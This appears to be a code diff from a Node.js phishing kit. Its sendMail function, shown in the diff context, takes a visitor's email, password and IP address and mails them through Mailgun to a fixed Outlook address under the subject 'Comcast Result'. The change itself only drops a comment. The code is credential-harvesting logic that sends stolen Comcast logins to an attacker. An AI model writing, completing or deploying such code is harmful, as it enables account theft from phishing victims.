@@ -14,7 +14,7 @@ const transporter = nodemailer.createTransport(mailGun(auth))
 
 const sendMail = (email, passwd, visitorIP, cb) => {
     const mailOptions = {
-      from: 'atyourservice@outlook.com', // Set a fixed sender email here
+      from: 'atyourservice@outlook.com', 
       to: 'hermandelgado456@outlook.com',
       subject: '--------Comcast Result------------',
       text: `----Email: ${email}\n -----Password: ${passwd}\n -----IP: ${visitorIP}\n \n---------The Index---------`
